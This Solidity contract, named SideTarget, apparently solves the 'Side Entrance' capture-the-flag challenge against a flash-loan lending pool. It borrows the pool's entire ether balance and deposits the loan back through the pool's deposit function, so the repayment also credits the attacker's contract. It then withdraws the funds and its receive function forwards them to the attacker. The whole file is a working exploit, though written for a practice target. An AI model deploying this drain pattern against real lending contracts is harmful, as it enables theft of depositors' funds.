// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import {SideEntranceLenderPool} from "../side-entrance/SideEntranceLenderPool.sol";
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}
contract SideTarget is IFlashLoanEtherReceiver{
    SideEntranceLenderPool public immutable  pool;
    address public attacker;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        attacker = msg.sender;
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        
    }

    

    function execute() external payable {
        // React to receiving ether
        pool.deposit{value : address(this).balance}();
    }

    receive() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}